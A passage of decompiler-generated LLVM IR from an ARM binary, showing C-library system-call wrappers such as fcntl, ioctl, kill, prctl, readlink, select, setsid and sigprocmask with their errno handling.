  uselistorder i32 %v0_10950, { 1, 0, 2 }
  uselistorder i32 %v4_10934, { 1, 0 }
  uselistorder i32 %v1_1093c, { 1, 2, 0 }
  uselistorder i32 %v4_10928, { 1, 0 }
  uselistorder i32 %v1_10930, { 1, 2, 0 }
  uselistorder i32 %v4_1091c, { 1, 0 }
  uselistorder i32 %v1_10924, { 1, 2, 0 }
  uselistorder i32 %v1_10948, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_10918, { 1, 0 }
  uselistorder i32 %v1_10944, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_10904, { 1, 0 }
  uselistorder i32 %v3_10900, { 1, 0 }
  uselistorder i32 %v1_10900, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_10904, { 1, 2, 0, 3 }
  uselistorder i32 %v4_108f0, { 1, 0 }
  uselistorder i32 %v4_108ec, { 2, 1, 0 }
  uselistorder i32 %v1_108f0, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_108f8.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_108c4, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_108c4, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_108b8, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 0, 1 }
  uselistorder i32 65535, { 104, 0, 1, 9, 10, 2, 3, 23, 22, 26, 52, 25, 53, 11, 12, 4, 27, 54, 28, 55, 56, 13, 57, 24, 29, 58, 30, 59, 31, 60, 61, 62, 32, 63, 64, 14, 65, 5, 36, 66, 35, 67, 33, 68, 34, 69, 70, 15, 71, 6, 72, 73, 40, 74, 39, 75, 37, 76, 38, 77, 17, 16, 78, 79, 41, 80, 42, 81, 19, 18, 82, 83, 43, 84, 44, 85, 86, 87, 45, 88, 89, 90, 91, 20, 92, 93, 7, 46, 94, 47, 95, 48, 96, 97, 98, 21, 99, 100, 8, 51, 101, 49, 102, 50, 103 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_10950, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_1090c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_108f8thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_109b8 = udiv i32 %arg1, %arg2
  ret i32 %v2_109b8
}

define i32 @__div0() local_unnamed_addr {
entry:
  %v1_109d4 = call i32 @__GI_raise(i32 8)
  ret i32 %v1_109d4
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v1_109f0 = add i32 %arg2, -12
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_109f0, 2
  br i1 %tmp, label %dec_label_pc_10a2c, label %dec_label_pc_10a08

dec_label_pc_10a08:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp12 = icmp ult i32 %arg1, -4095
  br i1 %tmp12, label %dec_label_pc_10a60, label %dec_label_pc_10a1c

dec_label_pc_10a1c:                               ; preds = %dec_label_pc_10a08
  %v0_10a20 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_10a54

dec_label_pc_10a2c:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp13 = icmp ugt i32 %arg1, -4096
  br i1 %tmp13, label %dec_label_pc_10a48, label %dec_label_pc_10a60

dec_label_pc_10a48:                               ; preds = %dec_label_pc_10a2c
  %v0_10a4c = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_10a54

dec_label_pc_10a54:                               ; preds = %dec_label_pc_10a1c, %dec_label_pc_10a48
  %storemerge2 = phi i32 [ %v0_10a20, %dec_label_pc_10a1c ], [ %v0_10a4c, %dec_label_pc_10a48 ]
  %storemerge.in = load i16, i16* @global_var_21a38.351, align 2
  %storemerge = sext i16 %storemerge.in to i32
  %v0_10a54 = load i32, i32* %r2.global-to-local, align 4
  %v1_10a54 = sub i32 0, %v0_10a54
  store i32 %v1_10a54, i32* %r2.global-to-local, align 4
  %v3_10a58 = add i32 %storemerge, %storemerge2
  %v4_10a58 = inttoptr i32 %v3_10a58 to i32*
  store i32 %v1_10a54, i32* %v4_10a58, align 4
  br label %dec_label_pc_10a60

dec_label_pc_10a60:                               ; preds = %dec_label_pc_10a08, %dec_label_pc_10a2c, %dec_label_pc_10a54
  %storemerge1 = phi i32 [ -1, %dec_label_pc_10a54 ], [ %arg1, %dec_label_pc_10a2c ], [ %arg1, %dec_label_pc_10a08 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i32 %arg1, { 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_10a60, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10a54, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_10a78 = load i32, i32* @r2, align 4
  %v9_10a78 = load i32, i32* @r3, align 4
  store i32 %v9_10a78, i32* %stack_var_-4, align 4
  %v3_10a7c = load i32, i32* @r4, align 4
  store i32 %v3_10a7c, i32* %stack_var_-32, align 4
  %v6_10a7c = load i32, i32* @r5, align 4
  %v12_10a7c = load i32, i32* @r7, align 4
  %v4_10a8c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 12800) to i32*), align 4
  %v2_10a94 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10a94, i32* @r3, align 4
  %v2_10a98 = icmp eq i32 %v4_10a8c, 0
  %v0_10aa0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10aa0, i32* @r5, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %v6_10a78, i32* @r4, align 4
  br i1 %v2_10a98, label %dec_label_pc_10abc, label %dec_label_pc_10ab0

dec_label_pc_10ab0:                               ; preds = %entry
  %v7_10ab0 = icmp eq i32 %arg2, 7
  br i1 %v7_10ab0, label %dec_label_pc_10afc, label %bb

bb:                                               ; preds = %dec_label_pc_10ab0
  %v8_10ab4 = icmp eq i32 %arg2, 14
  br i1 %v8_10ab4, label %dec_label_pc_10afc, label %dec_label_pc_10abc

dec_label_pc_10abc:                               ; preds = %bb, %entry
  store i32 %arg2, i32* @r1, align 4
  store i32 %v0_10aa0, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_10aa0, -4095
  br i1 %tmp, label %dec_label_pc_10af4, label %dec_label_pc_10adc

dec_label_pc_10adc:                               ; preds = %dec_label_pc_10abc
  %v0_10ae0 = call i32 @__aeabi_read_tp()
  %v3_10ae4 = load i16, i16* @global_var_21a38.351, align 2
  %v4_10ae4 = sext i16 %v3_10ae4 to i32
  store i32 %v4_10ae4, i32* @r3, align 4
  %v0_10ae8 = load i32, i32* @r2, align 4
  %v1_10ae8 = sub i32 0, %v0_10ae8
  store i32 %v1_10ae8, i32* @r2, align 4
  %v3_10aec = add i32 %v4_10ae4, %v0_10ae0
  %v4_10aec = inttoptr i32 %v3_10aec to i32*
  store i32 %v1_10ae8, i32* %v4_10aec, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10af4

dec_label_pc_10af4:                               ; preds = %dec_label_pc_10abc, %dec_label_pc_10adc
  %v0_10af4 = phi i32 [ %v0_10aa0, %dec_label_pc_10abc ], [ -1, %dec_label_pc_10adc ]
  br label %dec_label_pc_10b48

dec_label_pc_10afc:                               ; preds = %dec_label_pc_10ab0, %bb
  %v0_10afc = call i32 @__libc_enable_asynccancel()
  %v0_10b00 = load i32, i32* @r7, align 4
  store i32 %v0_10b00, i32* @r1, align 4
  store i32 %v0_10afc, i32* %r6.global-to-local, align 4
  %v0_10b0c = load i32, i32* @r5, align 4
  store i32 %v0_10b0c, i32* %r0.global-to-local, align 4
  store i32 %v0_10b0c, i32* @r2, align 4
  %tmp15 = icmp ult i32 %v0_10b0c, -4095
  br i1 %tmp15, label %dec_label_pc_10b3c, label %dec_label_pc_10b24

dec_label_pc_10b24:                               ; preds = %dec_label_pc_10afc
  %v1_10b28 = sub i32 0, %v0_10b0c
  %v0_10b2c = call i32 @__aeabi_read_tp()
  store i32 %v0_10b2c, i32* %r0.global-to-local, align 4
  %v3_10b30 = load i16, i16* @global_var_21a38.351, align 2
  %v4_10b30 = sext i16 %v3_10b30 to i32
  store i32 %v4_10b30, i32* @r3, align 4
  %v3_10b34 = add i32 %v4_10b30, %v0_10b2c
  %v4_10b34 = inttoptr i32 %v3_10b34 to i32*
  store i32 %v1_10b28, i32* %v4_10b34, align 4
  store i32 -1, i32* @r2, align 4
  %v0_10b3c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10b3c

dec_label_pc_10b3c:                               ; preds = %dec_label_pc_10afc, %dec_label_pc_10b24
  %v0_10b40 = phi i32 [ %v0_10b0c, %dec_label_pc_10afc ], [ -1, %dec_label_pc_10b24 ]
  %v0_10b3c = phi i32 [ %v0_10afc, %dec_label_pc_10afc ], [ %v0_10b3c.pre, %dec_label_pc_10b24 ]
  store i32 %v0_10b3c, i32* %r0.global-to-local, align 4
  store i32 %v0_10b40, i32* @r7, align 4
  %v1_10b44 = call i32 @__libc_disable_asynccancel(i32 %v0_10b3c)
  store i32 %v1_10b44, i32* %r0.global-to-local, align 4
  %v0_10b48.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10b48

dec_label_pc_10b48:                               ; preds = %dec_label_pc_10af4, %dec_label_pc_10b3c
  %v0_10b48 = phi i32 [ %v0_10af4, %dec_label_pc_10af4 ], [ %v0_10b48.pre, %dec_label_pc_10b3c ]
  store i32 %v0_10b48, i32* %r0.global-to-local, align 4
  %v2_10b50 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_10b50, i32* @r4, align 4
  store i32 %v6_10a7c, i32* @r5, align 4
  store i32 %v12_10a7c, i32* @r7, align 4
  ret i32 %v0_10b48

; uselistorder directives
  uselistorder i32 %v0_10b48, { 1, 0 }
  uselistorder i32 %v0_10b3c, { 1, 0 }
  uselistorder i32 %v0_10b0c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_10aa0, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 2, 7, 6, 0, 1 }
  uselistorder label %dec_label_pc_10b48, { 1, 0 }
  uselistorder label %dec_label_pc_10b3c, { 1, 0 }
  uselistorder label %dec_label_pc_10afc, { 1, 0 }
  uselistorder label %dec_label_pc_10af4, { 1, 0 }
}

define i32 @getppid() local_unnamed_addr {
entry:
  %v1_10b7c = load i32, i32* @r0, align 4
  ret i32 %v1_10b7c
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v9_10b80 = load i32, i32* @r3, align 4
  store i32 %v9_10b80, i32* %stack_var_-4, align 4
  %v3_10b84 = load i32, i32* @r4, align 4
  store i32 %v3_10b84, i32* %stack_var_-32, align 4
  %v6_10b84 = load i32, i32* @r5, align 4
  %v12_10b84 = load i32, i32* @r7, align 4
  %v4_10b94 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 12800) to i32*), align 4
  %v2_10b9c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10b9c, i32* @r3, align 4
  %v2_10ba0 = icmp eq i32 %v4_10b94, 0
  %v0_10ba8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10ba8, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  br i1 %v2_10ba0, label %dec_label_pc_10bb8, label %dec_label_pc_10bf0

dec_label_pc_10bb8:                               ; preds = %entry
  %tmp = icmp ult i32 %v0_10ba8, -4095
  br i1 %tmp, label %dec_label_pc_10be8, label %dec_label_pc_10bd0

dec_label_pc_10bd0:                               ; preds = %dec_label_pc_10bb8
  %v1_10bd4 = sub i32 0, %v0_10ba8
  %v3_10bd8 = load i16, i16* @global_var_21a38.351, align 2
  %v4_10bd8 = sext i16 %v3_10bd8 to i32
  store i32 %v4_10bd8, i32* @r3, align 4
  %v0_10bdc = call i32 @__aeabi_read_tp()
  %v2_10be0 = load i32, i32* @r3, align 4
  %v3_10be0 = add i32 %v2_10be0, %v0_10bdc
  %v4_10be0 = inttoptr i32 %v3_10be0 to i32*
  store i32 %v1_10bd4, i32* %v4_10be0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10be8

dec_label_pc_10be8:                               ; preds = %dec_label_pc_10bb8, %dec_label_pc_10bd0
  %v0_10be8 = phi i32 [ %v0_10ba8, %dec_label_pc_10bb8 ], [ -1, %dec_label_pc_10bd0 ]
  br label %dec_label_pc_10c3c

dec_label_pc_10bf0:                               ; preds = %entry
  %v0_10bf0 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_10bf0, i32* %r6.global-to-local, align 4
  %v0_10c00 = load i32, i32* @r4, align 4
  store i32 %v0_10c00, i32* %r0.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_10c00, -4095
  br i1 %tmp15, label %dec_label_pc_10c30, label %dec_label_pc_10c18

dec_label_pc_10c18:                               ; preds = %dec_label_pc_10bf0
  %v1_10c1c = sub i32 0, %v0_10c00
  %v3_10c20 = load i16, i16* @global_var_21a38.351, align 2
  %v4_10c20 = sext i16 %v3_10c20 to i32
  store i32 %v4_10c20, i32* @r3, align 4
  %v0_10c24 = call i32 @__aeabi_read_tp()
  store i32 %v0_10c24, i32* %r0.global-to-local, align 4
  %v2_10c28 = load i32, i32* @r3, align 4
  %v3_10c28 = add i32 %v2_10c28, %v0_10c24
  %v4_10c28 = inttoptr i32 %v3_10c28 to i32*
  store i32 %v1_10c1c, i32* %v4_10c28, align 4
  %v0_10c30.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10c30

dec_label_pc_10c30:                               ; preds = %dec_label_pc_10bf0, %dec_label_pc_10c18
  %v0_10c34 = phi i32 [ %v0_10c00, %dec_label_pc_10bf0 ], [ -1, %dec_label_pc_10c18 ]
  %v0_10c30 = phi i32 [ %v0_10bf0, %dec_label_pc_10bf0 ], [ %v0_10c30.pre, %dec_label_pc_10c18 ]
  store i32 %v0_10c30, i32* %r0.global-to-local, align 4
  store i32 %v0_10c34, i32* @r7, align 4
  %v1_10c38 = call i32 @__libc_disable_asynccancel(i32 %v0_10c30)
  store i32 %v1_10c38, i32* %r0.global-to-local, align 4
  %v0_10c3c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10c3c

dec_label_pc_10c3c:                               ; preds = %dec_label_pc_10be8, %dec_label_pc_10c30
  %v0_10c3c = phi i32 [ %v0_10be8, %dec_label_pc_10be8 ], [ %v0_10c3c.pre, %dec_label_pc_10c30 ]
  store i32 %v0_10c3c, i32* %r0.global-to-local, align 4
  %v2_10c44 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_10c44, i32* @r4, align 4
  store i32 %v6_10b84, i32* @r5, align 4
  store i32 %v12_10b84, i32* @r7, align 4
  ret i32 %v0_10c3c

; uselistorder directives
  uselistorder i32 %v0_10c3c, { 1, 0 }
  uselistorder i32 %v0_10c30, { 1, 0 }
  uselistorder i32 %v0_10c00, { 1, 2, 0, 3 }
  uselistorder i32 %v0_10ba8, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 7, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_10c3c, { 1, 0 }
  uselistorder label %dec_label_pc_10c30, { 1, 0 }
  uselistorder label %dec_label_pc_10be8, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10c60 = load i32, i32* @r7, align 4
  store i32 %v3_10c60, i32* %stack_var_-8, align 4
  %v0_10c6c = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10c6c, -4095
  br i1 %tmp, label %dec_label_pc_10c8c, label %dec_label_pc_10c74

dec_label_pc_10c74:                               ; preds = %entry
  %v1_10c78 = sub i32 0, %v0_10c6c
  %v3_10c7c = load i16, i16* @global_var_21a38.351, align 2
  %v4_10c7c = sext i16 %v3_10c7c to i32
  %v0_10c80 = call i32 @__aeabi_read_tp()
  %v3_10c84 = add i32 %v4_10c7c, %v0_10c80
  %v4_10c84 = inttoptr i32 %v3_10c84 to i32*
  store i32 %v1_10c78, i32* %v4_10c84, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10c8c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10c8c

dec_label_pc_10c8c:                               ; preds = %entry, %dec_label_pc_10c74
  %v1_10c90 = phi i32 [ %v0_10c6c, %entry ], [ -1, %dec_label_pc_10c74 ]
  %v2_10c8c = phi i32 [ %v3_10c60, %entry ], [ %v2_10c8c.pre, %dec_label_pc_10c74 ]
  store i32 %v2_10c8c, i32* @r7, align 4
  ret i32 %v1_10c90

; uselistorder directives
  uselistorder i32 %v0_10c6c, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10c8c, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_10c98 = load i32, i32* @r4, align 4
  store i32 %v3_10c98, i32* %stack_var_-12, align 4
  %v0_10ca8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10ca8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10ca8, -4095
  br i1 %tmp, label %dec_label_pc_10cd0, label %dec_label_pc_10cb8

dec_label_pc_10cb8:                               ; preds = %entry
  %v0_10cbc = call i32 @__aeabi_read_tp()
  %v3_10cc0 = load i16, i16* @global_var_21a38.351, align 2
  %v4_10cc0 = sext i16 %v3_10cc0 to i32
  %v0_10cc4 = load i32, i32* %r2.global-to-local, align 4
  %v1_10cc4 = sub i32 0, %v0_10cc4
  store i32 %v1_10cc4, i32* %r2.global-to-local, align 4
  %v3_10cc8 = add i32 %v4_10cc0, %v0_10cbc
  %v4_10cc8 = inttoptr i32 %v3_10cc8 to i32*
  store i32 %v1_10cc4, i32* %v4_10cc8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10cd0.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_10cd0

dec_label_pc_10cd0:                               ; preds = %entry, %dec_label_pc_10cb8
  %v1_10cd4 = phi i32 [ %v0_10ca8, %entry ], [ -1, %dec_label_pc_10cb8 ]
  %v2_10cd0 = phi i32 [ %v3_10c98, %entry ], [ %v2_10cd0.pre, %dec_label_pc_10cb8 ]
  store i32 %v2_10cd0, i32* @r4, align 4
  ret i32 %v1_10cd4

; uselistorder directives
  uselistorder i32 %v0_10ca8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10cd0, { 1, 0 }
}

define i32 @readlink(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10cdc = load i32, i32* @r7, align 4
  store i32 %v3_10cdc, i32* %stack_var_-8, align 4
  %v0_10ce8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10ce8, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_10ce8, -4095
  br i1 %tmp, label %dec_label_pc_10d10, label %dec_label_pc_10cf8

dec_label_pc_10cf8:                               ; preds = %entry
  %v0_10cfc = call i32 @__aeabi_read_tp()
  %v3_10d00 = load i16, i16* @global_var_21a38.351, align 2
  %v4_10d00 = sext i16 %v3_10d00 to i32
  store i32 %v4_10d00, i32* @r3, align 4
  %v0_10d04 = load i32, i32* @r2, align 4
  %v1_10d04 = sub i32 0, %v0_10d04
  store i32 %v1_10d04, i32* @r2, align 4
  %v3_10d08 = add i32 %v4_10d00, %v0_10cfc
  %v4_10d08 = inttoptr i32 %v3_10d08 to i32*
  store i32 %v1_10d04, i32* %v4_10d08, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10d10.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10d10

dec_label_pc_10d10:                               ; preds = %entry, %dec_label_pc_10cf8
  %v1_10d14 = phi i32 [ %v0_10ce8, %entry ], [ -1, %dec_label_pc_10cf8 ]
  %v2_10d10 = phi i32 [ %v3_10cdc, %entry ], [ %v2_10d10.pre, %dec_label_pc_10cf8 ]
  store i32 %v2_10d10, i32* @r7, align 4
  ret i32 %v1_10d14

; uselistorder directives
  uselistorder i32 %v0_10ce8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10d10, { 1, 0 }
}

define i32 @__syscall_select() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_10d1c = load i32, i32* @r4, align 4
  store i32 %v3_10d1c, i32* %stack_var_-12, align 4
  %v0_10d2c = load i32, i32* @r0, align 4
  store i32 %v0_10d2c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10d2c, -4095
  br i1 %tmp, label %dec_label_pc_10d54, label %dec_label_pc_10d3c

dec_label_pc_10d3c:                               ; preds = %entry
  %v0_10d40 = call i32 @__aeabi_read_tp()
  %v3_10d44 = load i16, i16* @global_var_21a38.351, align 2
  %v4_10d44 = sext i16 %v3_10d44 to i32
  %v0_10d48 = load i32, i32* %r2.global-to-local, align 4
  %v1_10d48 = sub i32 0, %v0_10d48
  store i32 %v1_10d48, i32* %r2.global-to-local, align 4
  %v3_10d4c = add i32 %v4_10d44, %v0_10d40
  %v4_10d4c = inttoptr i32 %v3_10d4c to i32*
  store i32 %v1_10d48, i32* %v4_10d4c, align 4
  %v2_10d54.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_10d54

dec_label_pc_10d54:                               ; preds = %entry, %dec_label_pc_10d3c
  %v1_10d58 = phi i32 [ %v0_10d2c, %entry ], [ -1, %dec_label_pc_10d3c ]
  %v2_10d54 = phi i32 [ %v3_10d1c, %entry ], [ %v2_10d54.pre, %dec_label_pc_10d3c ]
  store i32 %v2_10d54, i32* @r4, align 4
  ret i32 %v1_10d58

; uselistorder directives
  uselistorder i32 %v0_10d2c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10d54, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_10d60 = load i32, i32* @r4, align 4
  store i32 %v3_10d60, i32* %stack_var_-28, align 4
  %v6_10d60 = load i32, i32* @r5, align 4
  %v9_10d60 = load i32, i32* @r6, align 4
  %v12_10d60 = load i32, i32* @r7, align 4
  %v15_10d60 = load i32, i32* @r8, align 4
  %v18_10d60 = load i32, i32* @sl, align 4
  %v21_10d60 = load i32, i32* @lr, align 4
  %v4_10d70 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32 12800) to i32*), align 4
  %v2_10d78 = icmp eq i32 %v4_10d70, 0
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_10d78, label %dec_label_pc_10d94, label %entry.dec_label_pc_10da0_crit_edge

entry.dec_label_pc_10da0_crit_edge:               ; preds = %entry
  br label %dec_label_pc_10da0

dec_label_pc_10d94:                               ; preds = %entry
  store i32 %v3_10d60, i32* @r4, align 4
  store i32 %v9_10d60, i32* @r6, align 4
  store i32 %v12_10d60, i32* @r7, align 4
  store i32 %v15_10d60, i32* @r8, align 4
  store i32 %v18_10d60, i32* %sl.global-to-local, align 4
  %v0_10d9c = call i32 @__syscall_select()
  br label %dec_label_pc_10da0

dec_label_pc_10da0:                               ; preds = %entry.dec_label_pc_10da0_crit_edge, %dec_label_pc_10d94
  %v0_10da0 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_10da0, i32* @r5, align 4
  %v0_10db4 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_10db4, i32* @r0, align 4
  %v0_10dbc = call i32 @__syscall_select()
  store i32 %v0_10dbc, i32* @r4, align 4
  %v0_10dc4 = load i32, i32* @r5, align 4
  %v1_10dc8 = call i32 @__libc_disable_asynccancel(i32 %v0_10dc4)
  %v0_10dcc = load i32, i32* @r4, align 4
  %v2_10dd4 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_10dd4, i32* @r4, align 4
  store i32 %v6_10d60, i32* @r5, align 4
  store i32 %v9_10d60, i32* @r6, align 4
  store i32 %v12_10d60, i32* @r7, align 4
  store i32 %v15_10d60, i32* @r8, align 4
  store i32 %v18_10d60, i32* @sl, align 4
  store i32 %v21_10d60, i32* @lr, align 4
  ret i32 %v0_10dcc

; uselistorder directives
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10da0, { 1, 0 }
}

define i32 @__GI_setsid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10de4 = load i32, i32* @r7, align 4
  store i32 %v3_10de4, i32* %stack_var_-8, align 4
  %v0_10df0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10df0, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10df0, -4095
  br i1 %tmp, label %dec_label_pc_10e18, label %dec_label_pc_10e00

dec_label_pc_10e00:                               ; preds = %entry
  %v0_10e04 = call i32 @__aeabi_read_tp()
  %v3_10e08 = load i16, i16* @global_var_21a38.351, align 2
  %v4_10e08 = sext i16 %v3_10e08 to i32
  %v0_10e0c = load i32, i32* %r2.global-to-local, align 4
  %v1_10e0c = sub i32 0, %v0_10e0c
  store i32 %v1_10e0c, i32* %r2.global-to-local, align 4
  %v3_10e10 = add i32 %v4_10e08, %v0_10e04
  %v4_10e10 = inttoptr i32 %v3_10e10 to i32*
  store i32 %v1_10e0c, i32* %v4_10e10, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10e18.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10e18

dec_label_pc_10e18:                               ; preds = %entry, %dec_label_pc_10e00
  %v1_10e1c = phi i32 [ %v0_10df0, %entry ], [ -1, %dec_label_pc_10e00 ]
  %v2_10e18 = phi i32 [ %v3_10de4, %entry ], [ %v2_10e18.pre, %dec_label_pc_10e00 ]
  store i32 %v2_10e18, i32* @r7, align 4
  ret i32 %v1_10e1c

; uselistorder directives
  uselistorder i32 %v0_10df0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10e18, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_10e28 = icmp eq i32* %arg2, null
  br i1 %v2_10e28, label %dec_label_pc_10e6c, label %dec_label_pc_10e3c

dec_label_pc_10e3c:                               ; preds = %entry
  %v2_10e3c = load i32, i32* %arg2, align 4
  %v1_10e40 = icmp slt i32 %v2_10e3c, 0
  br i1 %v1_10e40, label %dec_label_pc_10e54, label %dec_label_pc_10e48

dec_label_pc_10e48:                               ; preds = %dec_label_pc_10e3c
  %tmp = ptrtoint i32* %arg2 to i32
  %.pre = add i32 %tmp, 4
  %.pre3 = inttoptr i32 %.pre to i32*
  %v3_10e48 = load i32, i32* %.pre3, align 4
  %v1_10e4c = urem i32 %v3_10e48, 2
